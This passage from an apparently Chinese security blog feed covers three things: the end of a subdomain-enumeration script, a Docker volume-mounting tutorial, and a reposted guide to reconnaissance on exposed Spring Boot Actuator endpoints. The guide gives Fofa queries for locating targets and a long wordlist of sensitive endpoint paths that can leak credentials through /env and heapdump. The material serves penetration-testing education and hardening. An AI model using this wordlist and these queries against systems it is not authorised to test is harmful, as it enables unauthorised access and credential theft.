[domain]&quot;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-a&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, dest=<span class="string">&#x27;main_domain&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;string&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-c&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, dest=<span class="string">&#x27;sub_domain&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;string&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    main_domain = options.main_domain</span><br><span class="line">    sub_domain = options.sub_domain</span><br><span class="line">    <span class="keyword">if</span> main_domain:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(random_to_A(main_domain)).replace(<span class="string">&quot;],&quot;</span>, <span class="string">&quot;],\n&quot;</span>))</span><br><span class="line">    <span class="keyword">elif</span> sub_domain:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(random_to_cname(sub_domain)).replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;\n&lt;&quot;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20221123165729592.png" alt="image-20221123165729592"></p>
<h1 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h1><ul>
<li><a href="https://www.cnblogs.com/piaomiaohongchen/p/15959042.html">https://www.cnblogs.com/piaomiaohongchen/p/15959042.html</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>信息收集</tag>
        <tag>子域名爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>容器数据卷</title>
    <url>/post/dbe3c4ee.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、什么是容器数据卷"><a href="#一、什么是容器数据卷" class="headerlink" title="一、什么是容器数据卷"></a>一、什么是容器数据卷</h1><p><strong>docker的理念回顾</strong></p>
<ul>
<li>总结一句话：容器的持久化和同步操作！容器间也是可以数据共享的</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630541629874-c6c6c90e-dc90-49ed-859e-48c65b046297.png" alt="img"></p>
<h1 id="二、使用数据卷"><a href="#二、使用数据卷" class="headerlink" title="二、使用数据卷"></a>二、使用数据卷</h1><p>&emsp;&emsp;直接使用命令来挂载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it -v 主机目录:容器内目录</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">测试</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker run -it -v /home/ceshi:/home centos /bin/bash</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">启动起来时我们可以通过  docker inspect 容器id  查看挂载情况</span></span><br><span class="line">[root@VM-0-15-centos ~]# cd /home</span><br><span class="line">[root@VM-0-15-centos home]# ls ceshi</span><br><span class="line">[root@VM-0-15-centos home]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE                 COMMAND                  CREATED         STATUS         PORTS                                       NAMES</span><br><span class="line">aa5de9eebf5e   centos                &quot;/bin/bash&quot;              2 minutes ago   Up 2 minutes                                               zen_bohr</span><br><span class="line">d93e31b351d5   portainer/portainer   &quot;/portainer&quot;             46 hours ago    Up 46 hours    0.0.0.0:8088-&gt;9000/tcp, :::8088-&gt;9000/tcp   romantic_kepler</span><br><span class="line">64dc6975f6e4   tomcat                &quot;catalina.sh run&quot;        47 hours ago    Up 47 hours    0.0.0.0:3355-&gt;8080/tcp, :::3355-&gt;8080/tcp   tomcat01</span><br><span class="line">d0850b4943fc   nginx                 &quot;/docker-entrypoint.…&quot;   2 days ago      Up 2 days      0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp       nginx01</span><br><span class="line">[root@VM-0-15-centos home]# docker inspect aa5d</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630542966825-f0791384-24af-4017-abae-425e57c69247.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630543153086-5a9e1cd4-1a62-4e50-bac7-81e911f1399c.png" alt="img"></p>
<h1 id="三、实战：安装MySQL"><a href="#三、实战：安装MySQL" class="headerlink" title="三、实战：安装MySQL"></a>三、实战：安装MySQL</h1><p>&emsp;&emsp;通过官方文档，可以看到安装启动MySQL，需要配置密码，这是要注意的！</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630544611582-1dfed120-efca-42be-b498-68e381c2c93c.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">启动MySQL</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name=mysql01 mysql</span><br><span class="line">863db62d897742e0e62d6c8a4ef9507b00bc1b56071e7768920f645995e4b3f6</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">-d 后台运行</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-p 端口映射</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-v 卷挂载</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-e 环境配置</span></span><br><span class="line"><span class="meta">#</span><span class="bash">--name 容器名字</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;注意安全组设置可以访问3310端口</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630544937573-c4fb08a3-a7c0-4aaf-bd27-ebded2eb7543.png" alt="img"></p>
<p>&emsp;&emsp;使用连接工具，可以看到连接服务器内容器的mysql成功</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630545044813-177e4fa7-f505-43cb-b58d-784d3ef0bd30.png" alt="img"></p>
<p>&emsp;&emsp;在本地测试创建一个数据库，查看一下我们的映射路径是否ok</p>
<ul>
<li>一开始是没有test数据库的，我们创建一个test数据库</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630545538413-5d71eb3d-99dd-4f77-919d-80305ab07c06.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630545580986-e87e45c1-696e-445f-852a-1d7eeee5f6f9.png" alt="img"></p>
<ul>
<li>再次查看目录，可以看到有test目录</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630545736602-a5537ca5-3de7-4ea0-9b0e-fa400d64b9c8.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630545711528-c807bf9b-956c-46e3-84ad-3951eba69c57.png" alt="img"></p>
<p>&emsp;&emsp;即使把容器删除，发现我们挂载到本地的数据卷依然没有丢失，这就实现了容器数据持久化功能</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630545813657-76203710-c8f6-4a73-b0e9-c6047dd89de6.png" alt="img"></p>
<h1 id="四、匿名挂载和具名挂载"><a href="#四、匿名挂载和具名挂载" class="headerlink" title="四、匿名挂载和具名挂载"></a>四、匿名挂载和具名挂载</h1><h2 id="1、匿名挂载"><a href="#1、匿名挂载" class="headerlink" title="1、匿名挂载"></a>1、匿名挂载</h2><p>&emsp;&emsp;<strong>只指定容器内，未指定容器外</strong></p>
<p>&emsp;&emsp;<code>docker run -d -P --name nginx01 -v /etc/nginx nginx</code></p>
<table>
<thead>
<tr>
<th><strong>-v 容器内路径</strong></th>
<th><strong>不去写主机上的路径，会自动创建一个路径</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>-P</strong></td>
<td><strong>大写的P，随机指定端口</strong></td>
</tr>
</tbody></table>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630546636984-d94391fe-6e23-41c9-885b-3e3fbbd153d6.png" alt="img"></p>
<p>&emsp;&emsp;<strong>docker volume命令</strong></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630546742308-d9aa0db4-d799-4a06-81d7-beed48aec1e6.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630546751820-c4d9ec99-d144-444c-93b2-7410a28e0752.png" alt="img"></p>
<p>&emsp;&emsp;能够发现卷的名称是一串字符，这种就是匿名挂载</p>
<p>&emsp;&emsp;<strong>在 -v 的时候只写了容器内的路径，没有写容器外的路径</strong></p>
<h2 id="2、具名挂载"><a href="#2、具名挂载" class="headerlink" title="2、具名挂载"></a>2、具名挂载</h2><p>&emsp;&emsp;<strong>通过 -v 卷名:容器内路径 来为卷命名</strong></p>
<p>&emsp;&emsp;<code>docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx nginx</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630546825628-934543c8-75d7-4966-af4a-9a03d1e631d5.png" alt="img"></p>
<p>&emsp;&emsp;<strong>查看卷名具体位置</strong>：<code>docker volume inspect juming-nginx</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630546874957-438eb950-5be5-44d5-9c0e-af604df2b3b7.png" alt="img"></p>
<p>&emsp;&emsp;所有的 docker 容器内的卷，没有指定目录的情况下都是在：**/var/lib/docker/volumes/xxxx/_data**</p>
<p>&emsp;&emsp;我们<strong>通过具名挂载可以方便的找到我们的一个卷</strong>，大多数情况也是在使用具名挂载</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630546960371-15b5f273-fb3b-4af4-b77a-46bbfb00966f.png" alt="img"></p>
<p>&emsp;&emsp;<strong>那么问题来了，我们该如何确定是具名挂载还是匿名挂载，亦或是指定路径挂载呢？</strong></p>
<table>
<thead>
<tr>
<th><strong>-v 容器内路径</strong></th>
<th><strong>匿名挂载</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>-v 卷名:容器内路径</strong></td>
<td><strong>具名挂载</strong></td>
</tr>
<tr>
<td><strong>-v /宿主机路径:容器内路径</strong></td>
<td><strong>指定路径挂载 ，注意有/</strong></td>
</tr>
</tbody></table>
<h1 id="五、容器权限"><a href="#五、容器权限" class="headerlink" title="五、容器权限"></a>五、容器权限</h1><p>&emsp;&emsp;有时候我们会遇到这样的一个命令，路径后面跟着一个 ro 或 rw</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:ro nginx</span><br><span class="line">docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:rw nginx</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;一旦设置了容器的权限，容器对我们挂载出来的内容就有限定了</p>
<p>&emsp;&emsp;<strong>只要看到 ro 就说明这个挂载路径只能通过宿主机来操作，容器内部是无法操作的，容器权限默认为 rw</strong></p>
<table>
<thead>
<tr>
<th><strong>ro</strong></th>
<th><strong>readonly，只读</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>rw</strong></td>
<td><strong>readwrite，可读可写</strong></td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>对于Spring Boot的渗透姿势</title>
    <url>/post/115ad433.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>文章转载于<a href="https://blog.zgsec.cn/index.php/archives/129/">https://blog.zgsec.cn/index.php/archives/129/</a></p>
<h1 id="一、Spring-Boot概述"><a href="#一、Spring-Boot概述" class="headerlink" title="一、Spring Boot概述"></a>一、Spring Boot概述</h1><p>Spring Boot 是由Pivotal团队提供的全新框架，其设计目的是用来简化 Spring 应用的创建、运行、调试、部署等。使用 Spring Boot 可以做到专注于 Spring 应用的开发，而无需过多关注 XML 的配置。Spring Boot 使用“习惯优于配置”的理念，简单来说，它提供了一堆依赖打包，并已经按照使用习惯解决了依赖问题。使用 Spring Boot 可以不用或者只需要很少的 Spring 配置就可以让企业项目快速运行起来。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675135738206-078eda2b-c351-4a65-9f69-1b21c1740169.png" alt="1675135738206-078eda2b-c351-4a65-9f69-1b21c1740169"></p>
<p>Spring Boot 是开发者和 Spring 本身框架的中间层，帮助开发者统筹管理应用的配置，提供基于实际开发中常见配置的默认处理（即习惯优于配置），简化应用的开发，简化应用的运维；总的来说，其目的 Spring Boot 就是为了对 Java web 的开发进行“简化”和加“快”速度，简化开发过程中引入或启动相关 Spring 功能的配置。这样带来的好处就是降低开发人员对于框架的关注点，可以把更多的精力放在自己的业务代码上。</p>
<h1 id="二、Spring-Boot-Actuator概述"><a href="#二、Spring-Boot-Actuator概述" class="headerlink" title="二、Spring Boot Actuator概述"></a>二、Spring Boot Actuator概述</h1><p>Actuator 是 Spring Boot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。</p>
<p>Actuator 的核心是端点 Endpoint，它用来监视应用程序及交互，spring-boot-actuator 中已经内置了非常多的 Endpoint（health、info、beans、metrics、httptrace、shutdown等等），同时也允许我们自己扩展自己的 Endpoints。每个 Endpoint 都可以启用和禁用。要远程访问 Endpoint，还必须通过 JMX 或 HTTP 进行暴露，大部分应用选择HTTP。</p>
<p>Actuator 在带来方便的同时，如果没有管理好，会导致一些敏感的信息泄露；可能会导致我们的服务器，被暴露到外网，服务器可能会沦陷。</p>
<h1 id="三、Spring-Boot框架的识别"><a href="#三、Spring-Boot框架的识别" class="headerlink" title="三、Spring Boot框架的识别"></a>三、Spring Boot框架的识别</h1><h2 id="1、通过icon图标进行识别"><a href="#1、通过icon图标进行识别" class="headerlink" title="1、通过icon图标进行识别"></a>1、通过icon图标进行识别</h2><p>Fofa语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icon_hash=&quot;116323821&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675135857553-5a39b72d-1592-4b37-a375-dce1f42b15d4.png" alt="1675135857553-5a39b72d-1592-4b37-a375-dce1f42b15d4"></p>
<p>可以搜索到25万条左右的资产数据，说明Spring Boot框架是应用广泛哈哈~（其中还有很多服务更改了默认的ico图标，所以这个语法找不到）</p>
<h2 id="2、通过网页内容进行识别"><a href="#2、通过网页内容进行识别" class="headerlink" title="2、通过网页内容进行识别"></a>2、通过网页内容进行识别</h2><p>哈哈，这个更夸张了，可以搜索到141万条左右的资产数据</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675135914759-cb890a37-3046-473d-82d5-3935e207cedf.png" alt="1675135914759-cb890a37-3046-473d-82d5-3935e207cedf"></p>
<p>以下是 Spring Boot 框架的典型特征：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675135940764-db1bcd1e-499f-4970-ae59-fa8c2af97b44.png" alt="1675135940764-db1bcd1e-499f-4970-ae59-fa8c2af97b44"></p>
<p>所以可以通过Fofa对网页的body内容进行搜索找到那么多的资产</p>
<h2 id="3、Spring-Boot框架-敏感信息泄露"><a href="#3、Spring-Boot框架-敏感信息泄露" class="headerlink" title="3、Spring Boot框架 敏感信息泄露"></a>3、Spring Boot框架 敏感信息泄露</h2><p>如果对 Spring Boot 框架熟悉的师傅，肯定知道对 Spring Boot 的渗透测试过程中，肯定不会少了敏感信息泄露和未授权访问相关的漏洞</p>
<p>不同版本分类讨论</p>
<ul>
<li>Spring Boot &lt; 1.5：默认未授权访问所有端点</li>
<li>Spring Boot &gt;= 1.5：默认只允许访问 /health 和 /info 端点，但是此安全性通常被应用程序开发人员禁用了</li>
</ul>
<h3 id="（1）常见端点及其作用"><a href="#（1）常见端点及其作用" class="headerlink" title="（1）常见端点及其作用"></a>（1）常见端点及其作用</h3><table>
<thead>
<tr>
<th>路径</th>
<th>是否默认启用</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td>/auditevents</td>
<td>是</td>
<td>显示当前应用程序的审计事件信息</td>
</tr>
<tr>
<td>/beans</td>
<td>是</td>
<td>显示一个应用中所有Spring Beans的完整列表</td>
</tr>
<tr>
<td>/conditions</td>
<td>是</td>
<td>显示配置类和自动配置类的状态及它们被应用或未被应用的原因</td>
</tr>
<tr>
<td>/configprops</td>
<td>是</td>
<td>显示一个所有@ConfigurationProperties的集合列表</td>
</tr>
<tr>
<td>/env</td>
<td>是</td>
<td>显示来自Spring的 ConfigurableEnvironment的属性</td>
</tr>
<tr>
<td>/flyway</td>
<td>是</td>
<td>显示数据库迁移路径（如果存在）</td>
</tr>
<tr>
<td>/health</td>
<td>是</td>
<td>显示应用的健康信息（当使用一个未认证连接访问时显示一个简单的’status’，使用认证连接访问则显示全部信息详情）</td>
</tr>
<tr>
<td>/info</td>
<td>是</td>
<td>显示任意的应用信息</td>
</tr>
<tr>
<td>/liquibase</td>
<td>是</td>
<td>展示任何Liquibase数据库迁移路径（如果存在）</td>
</tr>
<tr>
<td>/metrics</td>
<td>是</td>
<td>展示当前应用的metrics信息</td>
</tr>
<tr>
<td>/mappings</td>
<td>是</td>
<td>显示一个所有@RequestMapping路径的集合列表</td>
</tr>
<tr>
<td>/scheduledtasks</td>
<td>是</td>
<td>显示应用程序中的计划任务</td>
</tr>
<tr>
<td>/sessions</td>
<td>否</td>
<td>允许从Spring会话支持的会话存储中检索和删除用户会话</td>
</tr>
<tr>
<td>/shutdown</td>
<td>否</td>
<td>允许应用以优雅的方式关闭（默认情况下不启用）</td>
</tr>
<tr>
<td>/threaddump</td>
<td>是</td>
<td>执行一个线程dump</td>
</tr>
<tr>
<td>/heapdump</td>
<td>是</td>
<td>返回一个GZip压缩的hprof堆dump文件</td>
</tr>
<tr>
<td>/jolokia</td>
<td>是</td>
<td>通过HTTP暴露JMX beans（当Jolokia在类路径上时，WebFlux不可用）</td>
</tr>
<tr>
<td>/logfile</td>
<td>是</td>
<td>返回日志文件内容（如果设置了logging.file或logging.path属性的话），支持使用HTTP Range头接收日志文件内容的部分信息</td>
</tr>
<tr>
<td>/prometheus</td>
<td>是</td>
<td>以可以被Prometheus服务器抓取的格式显示metrics信息</td>
</tr>
</tbody></table>
<h3 id="（2）独家字典"><a href="#（2）独家字典" class="headerlink" title="（2）独家字典"></a>（2）独家字典</h3><p><strong>于是，我这里独家整理了一份信息泄露字典（欢迎补充哈哈）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">actuator</span><br><span class="line">actuator/auditLog</span><br><span class="line">actuator/auditevents</span><br><span class="line">actuator/autoconfig</span><br><span class="line">actuator/beans</span><br><span class="line">actuator/caches</span><br><span class="line">actuator/conditions</span><br><span class="line">actuator/configurationMetadata</span><br><span class="line">actuator/configprops</span><br><span class="line">actuator/dump</span><br><span class="line">actuator/env</span><br><span class="line">actuator/events</span><br><span class="line">actuator/exportRegisteredServices</span><br><span class="line">actuator/features</span><br><span class="line">actuator/flyway</span><br><span class="line">actuator/health</span><br><span class="line">actuator/heapdump</span><br><span class="line">actuator/healthcheck</span><br><span class="line">actuator/heapdump</span><br><span class="line">actuator/httptrace</span><br><span class="line">actuator/hystrix.stream</span><br><span class="line">actuator/info</span><br><span class="line">actuator/integrationgraph</span><br><span class="line">actuator/jolokia</span><br><span class="line">actuator/logfile</span><br><span class="line">actuator/loggers</span><br><span class="line">actuator/loggingConfig</span><br><span class="line">actuator/liquibase</span><br><span class="line">actuator/metrics</span><br><span class="line">actuator/mappings</span><br><span class="line">actuator/scheduledtasks</span><br><span class="line">actuator/swagger-ui.html</span><br><span class="line">actuator/prometheus</span><br><span class="line">actuator/refresh</span><br><span class="line">actuator/registeredServices</span><br><span class="line">actuator/releaseAttributes</span><br><span class="line">actuator/resolveAttributes</span><br><span class="line">actuator/scheduledtasks</span><br><span class="line">actuator/sessions</span><br><span class="line">actuator/springWebflow</span><br><span class="line">actuator/shutdown</span><br><span class="line">actuator/sso</span><br><span class="line">actuator/ssoSessions</span><br><span class="line">actuator/statistics</span><br><span class="line">actuator/status</span><br><span class="line">actuator/threaddump</span><br><span class="line">actuator/trace</span><br><span class="line">auditevents</span><br><span class="line">autoconfig</span><br><span class="line">api.html</span><br><span class="line">api/index.html</span><br><span class="line">api/swagger-ui.html</span><br><span class="line">api/v2/api-docs</span><br><span class="line">api-docs</span><br><span class="line">beans</span><br><span class="line">caches</span><br><span class="line">cloudfoundryapplication</span><br><span class="line">conditions</span><br><span class="line">configprops</span><br><span class="line">distv2/index.html</span><br><span class="line">docs</span><br><span class="line">druid/index.html</span><br><span class="line">druid/login.html</span><br><span class="line">druid/websession.html</span><br><span class="line">dubbo-provider/distv2/index.html</span><br><span class="line">dump</span><br><span class="line">entity/all</span><br><span class="line">env</span><br><span class="line">env/(name)</span><br><span class="line">eureka</span><br><span class="line">flyway</span><br><span class="line">gateway/actuator</span><br><span class="line">gateway/actuator/auditevents</span><br><span class="line">gateway/actuator/beans</span><br><span class="line">gateway/actuator/conditions</span><br><span class="line">gateway/actuator/configprops</span><br><span class="line">gateway/actuator/env</span><br><span class="line">gateway/actuator/health</span><br><span class="line">gateway/actuator/heapdump</span><br><span class="line">gateway/actuator/httptrace</span><br><span class="line">gateway/actuator/hystrix.stream</span><br><span class="line">gateway/actuator/info</span><br><span class="line">gateway/actuator/jolokia</span><br><span class="line">gateway/actuator/logfile</span><br><span class="line">gateway/actuator/loggers</span><br><span class="line">gateway/actuator/mappings</span><br><span class="line">gateway/actuator/metrics</span><br><span class="line">gateway/actuator/scheduledtasks</span><br><span class="line">gateway/actuator/swagger-ui.html</span><br><span class="line">gateway/actuator/threaddump</span><br><span class="line">gateway/actuator/trace</span><br><span class="line">health</span><br><span class="line">heapdump</span><br><span class="line">heapdump.json</span><br><span class="line">httptrace</span><br><span class="line">hystrix</span><br><span class="line">hystrix.stream</span><br><span class="line">info</span><br><span class="line">integrationgraph</span><br><span class="line">jolokia</span><br><span class="line">jolokia/list</span><br><span class="line">liquibase</span><br><span class="line">list</span><br><span class="line">logfile</span><br><span class="line">loggers</span><br><span class="line">liquibase</span><br><span class="line">metrics</span><br><span class="line">mappings</span><br><span class="line">monitor</span><br><span class="line">prometheus</span><br><span class="line">refresh</span><br><span class="line">scheduledtasks</span><br><span class="line">sessions</span><br><span class="line">shutdown</span><br><span class="line">spring-security-oauth-resource/swagger-ui.html</span><br><span class="line">spring-security-rest/api/swagger-ui.html</span><br><span class="line">static/swagger.json</span><br><span class="line">sw/swagger-ui.html</span><br><span class="line">swagger</span><br><span class="line">swagger/codes</span><br><span class="line">swagger/index.html</span><br><span class="line">swagger/static/index.html</span><br><span class="line">swagger/swagger-ui.html</span><br><span class="line">swagger-dubbo/api-docs</span><br><span class="line">swagger-ui</span><br><span class="line">swagger-ui.html</span><br><span class="line">swagger-ui/html</span><br><span class="line">swagger-ui/index.html</span><br><span class="line">system/druid/index.html</span><br><span class="line">threaddump</span><br><span class="line">template/swagger-ui.html</span><br><span class="line">trace</span><br><span class="line">user/swagger-ui.html</span><br><span class="line">version</span><br><span class="line">v1.1/swagger-ui.html</span><br><span class="line">v1.2/swagger-ui.html</span><br><span class="line">v1.3/swagger-ui.html</span><br><span class="line">v1.4/swagger-ui.html</span><br><span class="line">v1.5/swagger-ui.html</span><br><span class="line">v1.6/swagger-ui.html</span><br><span class="line">v1.7/swagger-ui.html</span><br><span class="line">/v1.8/swagger-ui.html</span><br><span class="line">/v1.9/swagger-ui.html</span><br><span class="line">/v2.0/swagger-ui.html</span><br><span class="line">v2.1/swagger-ui.html</span><br><span class="line">v2.2/swagger-ui.html</span><br><span class="line">v2.3/swagger-ui.html</span><br><span class="line">v2/swagger.json</span><br><span class="line">webpage/system/druid/index.html</span><br><span class="line">%20/swagger-ui.html</span><br></pre></td></tr></table></figure>

<h3 id="（3）端点的敏感信息泄露样例"><a href="#（3）端点的敏感信息泄露样例" class="headerlink" title="（3）端点的敏感信息泄露样例"></a>（3）端点的敏感信息泄露样例</h3><p>这里先安利一款谷歌浏览器插件哈，名字叫 JSON Viewer ，可以美化JSON的相关页面</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675136177482-fe62e473-bd73-4fa9-b34b-1bca36787b75.png" alt="1675136177482-fe62e473-bd73-4fa9-b34b-1bca36787b75"></p>
<h4 id="a、访问-actuator"><a href="#a、访问-actuator" class="headerlink" title="a、访问/actuator"></a>a、访问/actuator</h4><p>如果设置了 <code>management.endpoints.web.exposure.include</code> 为 <code>*</code>，就可以在 <code>/actuator</code> 看到所有存在的端点，截图如下：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675136309219-254022e0-8376-4e0d-89f0-cef6c790315b.png" alt="1675136309219-254022e0-8376-4e0d-89f0-cef6c790315b"></p>
<h4 id="b、访问-actuator-version"><a href="#b、访问-actuator-version" class="headerlink" title="b、访问/actuator/version"></a>b、访问/actuator/version</h4><p>会泄露一些相关的版本信息</p>
<p>但这个目前很少有泄露了，一时半会没找到实例</p>
<h4 id="c、访问-env或者-actuator-env"><a href="#c、访问-env或者-actuator-env" class="headerlink" title="c、访问/env或者/actuator/env"></a>c、访问/env或者/actuator/env</h4><p>可能会泄露数据库账号密码等敏感信息</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675136404362-3909b49a-e0ce-4a52-b3e2-067a63ce7ccb.png" alt="1675136404362-3909b49a-e0ce-4a52-b3e2-067a63ce7ccb"></p>
<p>针对env这种路径下泄露的密码会用星号进行脱敏，想要获取相应的明文密码，可以尝试通过分析heapdump数据的方式</p>
<h4 id="d、访问-actuator-metrics"><a href="#d、访问-actuator-metrics" class="headerlink" title="d、访问/actuator/metrics"></a>d、访问/actuator/metrics</h4><p>获得每个度量的名称，其中主要监控了JVM内容使用、GC情况、类加载信息等</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675136452416-b98e0c53-9701-4577-bb2c-c1844e948680.png" alt="1675136452416-b98e0c53-9701-4577-bb2c-c1844e948680"></p>
<p>如果想要得到每个度量的详细信息，需要传递度量的名称到URL中，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xx.xx.xx.xx/actuator/metrics/http.server.requests</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675136481497-d7252c69-9641-4cb8-b213-74613745832f.png" alt="1675136481497-d7252c69-9641-4cb8-b213-74613745832f"></p>
<h4 id="e、访问-actuator-threaddump"><a href="#e、访问-actuator-threaddump" class="headerlink" title="e、访问/actuator/threaddump"></a>e、访问/actuator/threaddump</h4><p>获取服务器的线程堆栈信息</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675136509575-02f0baa7-b1b9-4bcc-b0bc-8681830e4cec.png" alt="1675136509575-02f0baa7-b1b9-4bcc-b0bc-8681830e4cec"></p>
<h4 id="f、访问-actuator-loggers"><a href="#f、访问-actuator-loggers" class="headerlink" title="f、访问/actuator/loggers"></a>f、访问/actuator/loggers</h4><p>获取服务器的日志级别</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675136535590-8acb63fa-60fd-4e35-a506-93cc91c6de86.png" alt="1675136535590-8acb63fa-60fd-4e35-a506-93cc91c6de86"></p>
<h4 id="g、访问-actuator-configprops"><a href="#g、访问-actuator-configprops" class="headerlink" title="g、访问/actuator/configprops"></a>g、访问/actuator/configprops</h4><p>查看配置文件中设置的属性内容，以及一些配置属性的默认值</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675136559967-cddad54e-83d0-40b8-9d44-ec29c7ce2792.png" alt="1675136559967-cddad54e-83d0-40b8-9d44-ec29c7ce2792"></p>
<h4 id="h、访问-actuator-info"><a href="#h、访问-actuator-info" class="headerlink" title="h、访问/actuator/info"></a>h、访问/actuator/info</h4><p>展示了关于应用的一般信息，这些信息从编译文件比如 META-INF/build-info.properties 或者 git 文件比如 git.properties 或者任何环境的 property 中获取</p>
<h4 id="i、访问-actuator-mappings"><a href="#i、访问-actuator-mappings" class="headerlink" title="i、访问/actuator/mappings"></a>i、访问/actuator/mappings</h4><p>响应信息描述全部的URI路径，以及它们和控制器的映射关系</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675136637560-fe86ec55-713a-40e6-8ff0-58c692b3f2ae.png" alt="1675136637560-fe86ec55-713a-40e6-8ff0-58c692b3f2ae"></p>
<h4 id="j、访问-actuator-health"><a href="#j、访问-actuator-health" class="headerlink" title="j、访问/actuator/health"></a>j、访问/actuator/health</h4><p>health一般只展示了简单的UP和DOWN状态，比如这样：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675144005203-33c90cfe-436d-4635-a55c-b24179ff347a.png" alt="1675144005203-33c90cfe-436d-4635-a55c-b24179ff347a"></p>
